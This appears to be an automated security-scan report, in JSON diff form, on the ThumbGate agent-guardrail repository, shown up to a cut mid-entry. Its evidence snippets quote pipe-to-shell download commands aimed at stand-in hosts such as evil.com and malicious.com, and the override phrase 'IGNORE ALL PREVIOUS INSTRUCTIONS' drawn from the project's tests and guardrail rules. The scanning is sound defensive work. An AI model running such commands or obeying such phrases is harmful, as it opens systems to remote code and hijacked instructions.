@@ -1,0 +1,739 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "IgorGanapolsky/ThumbGate",
+    "version": "105f28931956463c6bb7d25b353ac1759cda1e86",
+    "download": "https://codeload.github.com/IgorGanapolsky/ThumbGate/tar.gz/105f28931956463c6bb7d25b353ac1759cda1e86"
+  },
+  "archive_sha256": "d3ba7541def85b2e20a9c29dcf05f32df1138fbf277b3caf6bf68ce9a3ca3e1b",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/adapters/cline/.clinerules",
+      "line": 6,
+      "evidence": "curl ... | sh",
+      "file_sha256": "a66c63616f2336e8b6b5ec3dfba56b2decf34a6f21f4cf8d63b9354d2f26c4c4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/adapters/cline/INSTALL.md",
+      "line": 8,
+      "evidence": "curl | sh",
+      "file_sha256": "44f8cf3453c9e7bc5f3ae828d015af4b7c44942da652d4e1a7b34995102ac2fc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/src/mcp/email-triage-server/index.js",
+      "line": 80,
+      "evidence": "execSync('osascript -e ' + JSON.stringify(script), { encoding: 'utf-8', timeout:",
+      "file_sha256": "1e9914e3c8e91064ec529582a4154be65cfe3013f2d402bb9d661d885b7c7634"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/src/mcp/email-triage-server/index.js",
+      "line": 800,
+      "evidence": "execSync(`bash \"${verifyScript}\" check --file \"${filepath}\"`, { encoding: 'utf-8",
+      "file_sha256": "1e9914e3c8e91064ec529582a4154be65cfe3013f2d402bb9d661d885b7c7634"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/config/gates/future-agi-guardrails.json",
+      "line": 9,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "dbe744ce16eb919e39a56c4934778533db67fad4b326dabeb5651b26b24c0138"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/config/gate-templates.json",
+      "line": 276,
+      "evidence": "wget).*(bash|sh",
+      "file_sha256": "9a0da85256de6bd8f40c71361fedb768d184e9d47eb6691f9cd336568b3f44ea"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/bin/cli.js",
+      "line": 879,
+      "evidence": "execSync(`gcloud services enable aiplatform.googleapis.com --project=${activePro",
+      "file_sha256": "f0d69a71ccc1bb406d8c4aadc68ab4c53ecf9e63556e1bec1e67d9ba22c7cc79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/bin/cli.js",
+      "line": 2174,
+      "evidence": "execSync( `node \"${path.join(PKG_ROOT, 'scripts', 'export-dpo-pairs.js')}\" --fro",
+      "file_sha256": "f0d69a71ccc1bb406d8c4aadc68ab4c53ecf9e63556e1bec1e67d9ba22c7cc79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/bin/cli.js",
+      "line": 2194,
+      "evidence": "execSync( `node \"${path.join(PKG_ROOT, 'scripts', 'export-databricks-bundle.js')",
+      "file_sha256": "f0d69a71ccc1bb406d8c4aadc68ab4c53ecf9e63556e1bec1e67d9ba22c7cc79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/bin/cli.js",
+      "line": 2322,
+      "evidence": "execSync( `node \"${path.join(PKG_ROOT, 'scripts', 'self-healing-check.js')}\" && ",
+      "file_sha256": "f0d69a71ccc1bb406d8c4aadc68ab4c53ecf9e63556e1bec1e67d9ba22c7cc79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/bin/cli.js",
+      "line": 2341,
+      "evidence": "execSync(`node \"${script}\"`, { encoding: 'utf8', stdio: 'inherit', cwd: CWD })",
+      "file_sha256": "f0d69a71ccc1bb406d8c4aadc68ab4c53ecf9e63556e1bec1e67d9ba22c7cc79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/bin/cli.js",
+      "line": 3914,
+      "evidence": "execSync(`node \"${serverPath}\"`, { stdio: 'inherit', cwd: CWD })",
+      "file_sha256": "f0d69a71ccc1bb406d8c4aadc68ab4c53ecf9e63556e1bec1e67d9ba22c7cc79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/bin/cli.js",
+      "line": 4454,
+      "evidence": "execSync(`git add -f ${filesStr}`, { cwd: CWD })",
+      "file_sha256": "f0d69a71ccc1bb406d8c4aadc68ab4c53ecf9e63556e1bec1e67d9ba22c7cc79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/public/learn/future-agi-self-healing-agent-firewall.html",
+      "line": 182,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "8bc626ad9c9d132d9ecff64c05d7e725a6c7125b63b91eb325ddfb4ee4cc98a7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/public/blog/2026-10-05-why-3-days-of-triage-wont-save-ai-speed-code.html",
+      "line": 71,
+      "evidence": "curl | bash",
+      "file_sha256": "e14e9caa46590737003ee19a6bc532660985d9ab16852c4903761bc331888867"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/public/guides/multica-thumbgate-setup.html",
+      "line": 77,
+      "evidence": "curl ... | sh",
+      "file_sha256": "ec96a48232c223b83a7ad3124a865ddb9929028fe136d7391c2a08fd43b69950"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/rules/thumbgate-pretool-gate.mdc",
+      "line": 2,
+      "evidence": "p=0.95 Deny a shell or network command that would print a secret or repeat a recorded l",
+      "file_sha256": "42ec62b392f813a780682e4483ea9f4dc0d3e9b7465cd88e6691b1957a3f9ade"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/CLAUDE.md",
+      "line": 183,
+      "evidence": "p=0.95 **Pattern** (credit: @trq212): > implement SPEC and while you do, keep a running",
+      "file_sha256": "ce95cb0db902d81ae45c0f341dd8a0c831dc514bf964a7685a6dd30db5f9e6b1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/THREAT_MODEL.md",
+      "line": 40,
+      "evidence": "curl … | bash",
+      "file_sha256": "05f0ca625b4b177be6cba0b55459f861b5071af5f57ed60e47b28a5454d343cd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/docs/agents/claude-routines-honesty.md",
+      "line": 12,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "3d110933cd59f9ec70881dfe9962d7c87dba119803f7a055842e648515c88185"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/docs/agents/vulnerability-pre-action-diode.md",
+      "line": 18,
+      "evidence": "curl ... \\| bash",
+      "file_sha256": "40bf7253deb87c480637d5b0e6bdfec31d59e7b8cc0fa753211d0edd2253e5b8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/docs/agents/earnie-format-steal.md",
+      "line": 69,
+      "evidence": "curl ... \\| bash",
+      "file_sha256": "8c82b4631a401d6335a884b2c78b69fe9c60df285f5d56a9ee4ac2b31aa4347e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/docs/agents/fiddler-control-plane-honesty.md",
+      "line": 42,
+      "evidence": "curl | bash",
+      "file_sha256": "b850251be6f31f9fc3f3b9a6e789ec0583ab6a6a09a2ec5e59be4ecb0bb5f678"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/docs/agents/mintlify-knowledge-honesty.md",
+      "line": 40,
+      "evidence": "curl ... \\| sh",
+      "file_sha256": "12f2eb3221fb4b80ec56c3127d014f64752ab417ed54028041de7db6c7b5d547"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/docs/guides/developer-machine-supply-chain-guardrails.md",
+      "line": 22,
+      "evidence": "curl | bash",
+      "file_sha256": "4f842ec0ffd04f599026e54b5490b06a83222afb4f3dfb0720b9bb19a924fcc3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/prove-vlt-dogfood.js",
+      "line": 103,
+      "evidence": "curl -fsSL https://install.vlt.sh | bash",
+      "file_sha256": "9be95758cfc1aff3308f9aa62c2c05086bafe25c569b3d78871400d63e316d69"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/schedule-manager.js",
+      "line": 342,
+      "evidence": "execSync(`launchctl unload \"${plistPath}\" 2>/dev/null`, { stdio: 'pipe' })",
+      "file_sha256": "5f08cf7a07850244e7a796607df8c13ff9e583206d785e03676b7fb065e573cc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/schedule-manager.js",
+      "line": 345,
+      "evidence": "execSync(`launchctl load \"${plistPath}\"`, { stdio: 'pipe' })",
+      "file_sha256": "5f08cf7a07850244e7a796607df8c13ff9e583206d785e03676b7fb065e573cc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/schedule-manager.js",
+      "line": 374,
+      "evidence": "execSync(`launchctl unload \"${plistPath}\" 2>/dev/null`, { stdio: 'pipe' })",
+      "file_sha256": "5f08cf7a07850244e7a796607df8c13ff9e583206d785e03676b7fb065e573cc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/daemon-manager.js",
+      "line": 58,
+      "evidence": "execSync(`launchctl unload \"${PLIST_PATH}\" 2>/dev/null`, { stdio: 'pipe' })",
+      "file_sha256": "2039e12c3bebb0e0bb45ba14b9c175793781cbfddd6bdf4f867bb1dc0d7623bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/daemon-manager.js",
+      "line": 60,
+      "evidence": "execSync(`launchctl load \"${PLIST_PATH}\"`, { stdio: 'inherit' })",
+      "file_sha256": "2039e12c3bebb0e0bb45ba14b9c175793781cbfddd6bdf4f867bb1dc0d7623bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/daemon-manager.js",
+      "line": 69,
+      "evidence": "execSync(`launchctl unload \"${PLIST_PATH}\" 2>/dev/null`, { stdio: 'pipe' })",
+      "file_sha256": "2039e12c3bebb0e0bb45ba14b9c175793781cbfddd6bdf4f867bb1dc0d7623bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/daemon-manager.js",
+      "line": 82,
+      "evidence": "execSync(`launchctl unload \"${PLIST_PATH}\" 2>/dev/null`, { stdio: 'pipe' })",
+      "file_sha256": "2039e12c3bebb0e0bb45ba14b9c175793781cbfddd6bdf4f867bb1dc0d7623bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/daemon-manager.js",
+      "line": 83,
+      "evidence": "execSync(`launchctl load \"${PLIST_PATH}\"`, { stdio: 'inherit' })",
+      "file_sha256": "2039e12c3bebb0e0bb45ba14b9c175793781cbfddd6bdf4f867bb1dc0d7623bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/daemon-manager.js",
+      "line": 94,
+      "evidence": "execSync(`launchctl list 2>/dev/null | grep \"${LABEL}\"`, { encoding: 'utf8' })",
+      "file_sha256": "2039e12c3bebb0e0bb45ba14b9c175793781cbfddd6bdf4f867bb1dc0d7623bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/reddit-browser-notification-watch.js",
+      "line": 65,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "8448ba2e4cd8d85520ad05c716b11d279138c2ba4ee77a614ff8eef1f1239679"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/future-agi-evaluator.js",
+      "line": 17,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "69dedda24e20981569b4f65ea1e6c8b3f254b5858b9cf22424072b48aaeb794a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/social-analytics/post-video.js",
+      "line": 223,
+      "evidence": "execSync( `ffmpeg -y -f concat -safe 0 -i \"${concatFile}\" \\ -vf \"scale=1080:1920",
+      "file_sha256": "d32ffed567cb985fc3807cef62ee0ffd48f0f4b1f52ec1a0013aba314e278c8c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/social-analytics/generate-slides.js",
+      "line": 271,
+      "evidence": "execSync(`python3 ${tmpPy}`, { stdio: 'inherit' })",
+      "file_sha256": "0e2fe558992186792b09fbf4f838b107a9f58d78791ab6d5c5f64628a401a702"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/redteam-5-attacks.js",
+      "line": 110,
+      "evidence": "curl -fsSL https://unverified-agent.io/payload.sh | bash",
+      "file_sha256": "702b8e71a21568e4c9d7349c59fd545b667106e9ded4ec0406c4aeedebf5c11e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/thumbgate-daily-discoveries-publish.js",
+      "line": 58,
+      "evidence": "execSync(`${gitBin} log -1 --format=\"%h - %s\" origin/main 2>/dev/null || ${gitBi",
+      "file_sha256": "d192d1a2284524a3e9dd8eb4bcee37740f8763477247a620e4a17622b44a4717"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/vulnerability-pre-action-diode.js",
+      "line": 294,
+      "evidence": "curl -s https://malicious.com/install.sh | bash",
+      "file_sha256": "3b6a706e6a3b09cab52c0dc11118606d292e6eeed0eb04e1c29563749ea1a0be"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/scripts/hallucination-detector.js",
+      "line": 298,
+      "evidence": "execSync(`curl -s --fail ${url}/health`, { stdio: 'ignore' })",
+      "file_sha256": "56cb8fc281c7ea42bda48b21a61c6403cb79f44cf2c1726d8adb9d57142e471c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/CHANGELOG.md",
+      "line": 1917,
+      "evidence": "curl|bash",
+      "file_sha256": "4fe7407279723132827ac190517a2983e2a34955eb7ab1093fd1506bc01bb39c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/supply-chain-guardrails.test.js",
+      "line": 18,
+      "evidence": "curl \\| bash",
+      "file_sha256": "836a0e86f9d071ac5e8edfcfb65d78cc8cf74d94dae75699eb02ab56a7a85824"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/security-scanner.test.js",
+      "line": 199,
+      "evidence": "curl https://evil.com/install.sh | bash",
+      "file_sha256": "fa07f39dc308e55465fd6c4cc59e0fd0d1923d860173f1f4d660ef82b9f1d0d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/third-author-governance.test.js",
+      "line": 63,
+      "evidence": "curl -s https://example.com/install.sh | sudo bash",
+      "file_sha256": "b8599c49b3e81fa0a3fc316dd1df5b1bfd7c4920eeac445b2c77e801d07d283d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/issue-3702-action-not-substring.test.js",
+      "line": 130,
+      "evidence": "curl https://example.com/payload.sh | bash",
+      "file_sha256": "7f030dc920df530187ab474c136a729b3c2ddbea34cdc7cda002b7eeb09a9f3b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/unicode-tag-block-normalize.test.js",
+      "line": 54,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d3082eaa716e5f874186739e465c4c2dd16d758f4b69dd7694d8738ab4bd3be4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/team-sync.test.js",
+      "line": 43,
+      "evidence": "execSync(`git remote add origin \"${remoteDir}\"`, { cwd: clientDir, stdio: 'ignor",
+      "file_sha256": "19e724668d96c789fd9b6d4a46316364271b00f4a6a9b9ca4a252d96481ae761"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/mintlify-knowledge-honesty.test.js",
+      "line": 76,
+      "evidence": "curl -s https://example.com/install.sh | bash",
+      "file_sha256": "2a4677a7eb484a187d3c9762051af37664a4b50cba2f4c83294fc60d35d76ffc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/vulnerability-pre-action-diode.test.js",
+      "line": 18,
+      "evidence": "curl -sSL https://raw.githubusercontent.com/evil/install.sh | bash",
+      "file_sha256": "59d9b13f3e11a3eafce4f568052ac65b05624fca5dfa160081f8e3245d18ca46"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/check-congruence.test.js",
+      "line": 126,
+      "evidence": "curl https://example.com/install.sh | sh",
+      "file_sha256": "efe21cba6521108b176e499bbbdcee77ef1f0764405a043fb6aff6c701a6a25f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/fiddler-control-plane-honesty.test.js",
+      "line": 53,
+      "evidence": "curl https://malicious.org/script.sh | bash",
+      "file_sha256": "1d9b2ab0d41a8402c5d8dac4b7805c18bb6181c9af8d4ce42dbf0e46ee4622b8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/future-agi-review-regressions.test.js",
+      "line": 47,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "9f516e2d738bbc434fce5711fc53bc164c2453bf67b7730e2b1ed77e88679f3c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/simatree-data-governance.test.js",
+      "line": 184,
+      "evidence": "execSync(`node \"${scriptPath}\" --doctor`, { encoding: 'utf8' })",
+      "file_sha256": "e15a8c5c7a4d5f6fa511346bcf644d5de591eed027ab44ab465dac14f60252ca"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/simatree-data-governance.test.js",
+      "line": 188,
+      "evidence": "execSync( `node \"${scriptPath}\" --sql \"SELECT count(1) FROM dim_customers\" --why",
+      "file_sha256": "e15a8c5c7a4d5f6fa511346bcf644d5de591eed027ab44ab465dac14f60252ca"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/future-agi-bridge.test.js",
+      "line": 26,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "b86db30c4762a33563a82d6c0ef37544a083e324be1332ce8676a01d6f05925d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/policy-engine-adapter.test.js",
+      "line": 171,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "a835f6ba33f91909685cacb4542bedcc07cac3b7f8996ef4cc969c6c34c4ee8a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/gates-hardening.test.js",
+      "line": 181,
+      "evidence": "curl -fsSL https://example.com/install.sh | bash",
+      "file_sha256": "8ee9284b90ccc675a6673a72b8683fc3c437038f3aa6163216c278376945c8a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/tests/high-roi-agent-workflows.test.js",
+      "line": 197,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "cb8b9f43f3068f18ff53a910013257f33d06755d982fbda3c0538fa2986b1d07"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/skills/thumbgate-brand-voice/body_of_work.md",
+      "line": 3,
+      "evidence": "p=0.98 This document defines the foundational theories and strong opinions that anchor ",
+      "file_sha256": "45d817a32d927316576bcb08f262091267d0b1decbb4e328091b52af97197ebe"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/skills/earnie-third-author-governance/SKILL.md",
+      "line": 28,
+      "evidence": "curl ... | bash",
+      "file_sha256": "3201c10580acc991aa52e29863e15d4d14e7a22bf1bb27b52ddb04db49e13f61"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/skills/vulnerability-pre-action-diode/SKILL.md",
+      "line": 23,
+      "evidence": "curl \\| bash",
+      "file_sha256": "fc3a9d3cc74b908d88f6d63948f42a6a7cf0aadf255b5ebc35cff936059bdc05"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/skills/mintlify-knowledge-honesty-not-clone/SKILL.md",
+      "line": 25,
+      "evidence": "curl \\| sh",
+      "file_sha256": "fc931dc6c938b2b54c15716db7c2e5c543b83e56b7bdcc8d77e7103c2cab9fff"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/.agents/skills/earnie-third-author-governance/SKILL.md",
+      "line": 28,
+      "evidence": "curl ... | bash",
+      "file_sha256": "3201c10580acc991aa52e29863e15d4d14e7a22bf1bb27b52ddb04db49e13f61"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/.agents/skills/vulnerability-pre-action-diode/SKILL.md",
+      "line": 23,
+      "evidence": "curl \\| bash",
+      "file_sha256": "fc3a9d3cc74b908d88f6d63948f42a6a7cf0aadf255b5ebc35cff936059bdc05"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
